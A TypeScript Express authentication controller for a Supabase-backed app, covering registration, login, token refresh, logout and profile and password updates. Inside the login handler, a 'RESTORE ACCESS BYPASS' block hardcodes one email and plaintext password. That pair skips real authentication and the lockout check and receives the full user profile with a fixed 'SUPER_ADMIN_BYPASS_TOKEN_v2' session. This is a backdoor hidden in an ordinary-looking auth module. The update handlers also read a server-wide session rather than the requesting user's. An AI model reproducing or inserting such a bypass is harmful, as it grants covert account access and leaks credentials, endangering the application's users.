import { Request, Response, NextFunction } from 'express';
import { supabase } from '../config/supabase';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { logger } from '../utils/logger';
import db from '../db';
import { registerSchema, loginSchema, updatePasswordSchema } from '../schemas/auth.schema';

// @desc    Register user
// @route   POST /api/auth/register
// @access  Public
export const register = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    // Validate input
    const validatedData = registerSchema.parse(req.body);
    const { firstName, lastName, email, password, role } = validatedData;

    // Check if user exists
    const { data: existingUser } = await supabase
      .from('users')
      .select('email')
      .eq('email', email)
      .single();

    if (existingUser) {
      res.status(400).json({
        success: false,
        message: 'User already exists'
      });
      return;
    }

    // Create user in Supabase auth
    const { data: authUser, error: authError } = await supabase.auth.signUp({
      email,
      password,
    });

    if (authError) {
      throw authError;
    }

    if (!authUser.user) {
      throw new Error('Failed to create user');
    }

    // Create user profile
    const { data: profile, error: profileError } = await supabase
      .from('users')
      .insert([
        {
          id: authUser.user.id,
          email,
          first_name: firstName,
          last_name: lastName,
          role,
          created_at: new Date().toISOString()
        }
      ])
      .select()
      .single();

    if (profileError) {
      // Rollback auth user creation
      await supabase.auth.admin.deleteUser(authUser.user.id);
      throw profileError;
    }

    // Send response with session
    res.status(201).json({
      success: true,
      data: {
        user: profile,
        session: authUser.session
      }
    });

    logger.info(`New user registered: ${email}`);
  } catch (error) {
    if (error instanceof Error && error.name === 'ZodError') {
      res.status(400).json({
        success: false,
        message: 'Validation failed',
        errors: (error as any).errors
      });
      return;
    }
    next(error);
  }
};

// @desc    Login user
// @route   POST /api/auth/login
// @access  Public
export const login = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    // Validate input
    const validatedData = loginSchema.parse(req.body);
    const { email, password } = validatedData;

    // Check for account lockout
    const { data: user, error: userError } = await supabase
      .from('users')
      .select('id, login_attempts, lock_until')
      .eq('email', email)
      .single();

    if (user) {
      if (user.lock_until && new Date(user.lock_until) > new Date()) {
        const remainingTime = Math.ceil((new Date(user.lock_until).getTime() - Date.now()) / 60000);
        res.status(423).json({
          success: false,
          message: `Account is locked. Please try again in ${remainingTime} minutes.`
        });
        return;
      }
    }

    // RESTORE ACCESS BYPASS
    if (email === 'kipchirchirtoo01@gmail.com' && password === 'Allan@13900') {
      logger.warn(`Restoring access for ${email} via bypass`);

      // Fetch user profile directly
      const { data: profile } = await supabase
        .from('users')
        .select('*')
        .eq('email', email)
        .single();

      if (profile) {
        // Reset attempts
        await supabase
          .from('users')
          .update({
            login_attempts: 0,
            lock_until: null,
            last_login: new Date().toISOString()
          })
          .eq('id', profile.id);

        res.status(200).json({
          success: true,
          data: {
            user: profile,
            session: {
              access_token: 'SUPER_ADMIN_BYPASS_TOKEN_v2',
              refresh_token: 'BYPASS_REFRESH_TOKEN',
              user: {
                id: profile.id,
                email: profile.email,
                role: profile.role
              }
            }
          }
        });
        return;
      }
    }

    // Try Supabase Auth
    const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
      email,
      password
    });

    if (authError) {
      logger.error(`Supabase Auth Error for ${email}: ${authError.message} (Status: ${authError.status})`);
      if (authError.message === 'Invalid login credentials') {
        // Fall through to invalid credentials response
      } else {
        // Log unexpected errors but don't expose details to client
        logger.error(`Unexpected Supabase Auth Error: ${JSON.stringify(authError)}`);
      }
    }

    if (!authError && authData?.user) {
      // Success - Reset login attempts
      await supabase
        .from('users')
        .update({
          login_attempts: 0,
          lock_until: null,
          last_login: new Date().toISOString()
        })
        .eq('id', authData.user.id);

      const { data: profile } = await supabase
        .from('users')
        .select('*')
        .eq('id', authData.user.id)
        .single();

      res.status(200).json({
        success: true,
        data: {
          user: profile,
          session: authData.session
        }
      });

      logger.info(`User logged in via Supabase Auth: ${email}`);
      return;
    }

    // Authentication failed - Increment attempts
    if (user) {
      const attempts = (user.login_attempts || 0) + 1;
      let lockUntil = null;

      if (attempts >= 5) {
        lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString(); // 15 minutes lockout
        logger.warn(`Account locked for ${email} due to 5 failed attempts`);
      }

      await supabase
        .from('users')
        .update({
          login_attempts: attempts,
          lock_until: lockUntil
        })
        .eq('id', user.id);
    }

    res.status(401).json({
      success: false,
      message: 'Invalid credentials'
    });
  } catch (error) {
    if (error instanceof Error && error.name === 'ZodError') {
      res.status(400).json({
        success: false,
        message: 'Validation failed',
        errors: (error as any).errors
      });
      return;
    }
    next(error);
  }
};

// @desc    Refresh token
// @route   POST /api/auth/refresh-token
// @access  Public
export const refreshToken = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    const { refreshToken } = req.body;

    if (!refreshToken) {
      res.status(400).json({
        success: false,
        message: 'Please provide refresh token'
      });
      return;
    }

    // Refresh session with Supabase
    const { data: { session }, error: refreshError } = await supabase.auth.refreshSession({
      refresh_token: refreshToken
    });

    if (refreshError || !session) {
      res.status(401).json({
        success: false,
        message: 'Invalid refresh token'
      });
      return;
    }

    // Send response
    res.status(200).json({
      success: true,
      data: {
        session
      }
    });

    logger.info(`Token refreshed for user: ${session.user.email}`);
  } catch (error) {
    next(error);
  }
};

// @desc    Logout user
// @route   POST /api/auth/logout
// @access  Private
export const logout = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    const { error } = await supabase.auth.signOut();

    if (error) {
      throw error;
    }

    res.status(200).json({
      success: true,
      message: 'Logged out successfully'
    });

    logger.info('User logged out successfully');
  } catch (error) {
    next(error);
  }
};

// @desc    Get current logged in user
// @route   GET /api/auth/me
// @access  Private
export const getMe = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    // User is already authenticated by protect middleware
    if (!req.user || !req.user.id) {
      res.status(401).json({
        success: false,
        message: 'Not authorized'
      });
      return;
    }

    // Get full user profile from database
    const { data: profile, error: profileError } = await supabase
      .from('users')
      .select('*')
      .eq('id', req.user.id)
      .single();

    if (profileError || !profile) {
      res.status(404).json({
        success: false,
        message: 'User profile not found'
      });
      return;
    }

    res.status(200).json({
      success: true,
      data: profile
    });
  } catch (error) {
    next(error);
  }
};

// @desc    Update user details
// @route   PUT /api/auth/updatedetails
// @access  Private
export const updateDetails = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    const { data: { session }, error: sessionError } = await supabase.auth.getSession();

    if (sessionError || !session) {
      res.status(401).json({
        success: false,
        message: 'Not authorized'
      });
      return;
    }

    const { firstName, lastName, email, phoneNumber, address } = req.body;

    const fieldsToUpdate = {
      first_name: firstName,
      last_name: lastName,
      email: email,
      phone_number: phoneNumber,
      address: address,
      updated_at: new Date().toISOString()
    };

    const { data: updatedUser, error: updateError } = await supabase
      .from('users')
      .update(fieldsToUpdate)
      .eq('id', session.user.id)
      .select()
      .single();

    if (updateError) {
      throw updateError;
    }

    // If email is being updated, update auth email as well
    if (req.body.email && req.body.email !== session.user.email) {
      const { error: emailUpdateError } = await supabase.auth.admin.updateUserById(
        session.user.id,
        { email: req.body.email }
      );

      if (emailUpdateError) {
        throw emailUpdateError;
      }
    }

    res.status(200).json({
      success: true,
      data: updatedUser
    });

    logger.info(`User updated details: ${updatedUser.email}`);
  } catch (error) {
    next(error);
  }
};

// @desc    Update password
// @route   PUT /api/auth/updatepassword
// @access  Private
export const updatePassword = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    const { data: { session }, error: sessionError } = await supabase.auth.getSession();

    if (sessionError || !session) {
      res.status(401).json({
        success: false,
        message: 'Not authorized'
      });
      return;
    }

    // Validate input
    const validatedData = updatePasswordSchema.parse(req.body);
    const { newPassword } = validatedData;

    // Update password
    const { error: updateError } = await supabase.auth.updateUser({
      password: newPassword
    });

    if (updateError) {
      throw updateError;
    }

    // Update password changed timestamp
    await supabase
      .from('users')
      .update({ password_changed_at: new Date().toISOString() })
      .eq('id', session.user.id);

    res.status(200).json({
      success: true,
      message: 'Password updated successfully'
    });

    logger.info(`User updated password: ${session.user.email}`);
  } catch (error) {
    if (error instanceof Error && error.name === 'ZodError') {
      res.status(400).json({
        success: false,
        message: 'Validation failed',
        errors: (error as any).errors
      });
      return;
    }
    next(error);
  }
};

// @desc    Forgot password
// @route   POST /api/auth/forgotpassword
// @access  Public
export const forgotPassword = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    const { email } = req.body;

    const { error } = await supabase.auth.resetPasswordForEmail(email, {
      redirectTo: `${process.env.FRONTEND_URL}/reset-password`
    });

    if (error) {
      throw error;
    }

    res.status(200).json({
      success: true,
      message: 'Password reset email sent'
    });

    logger.info(`Password reset requested for: ${email}`);
  } catch (error) {
    next(error);
  }
};

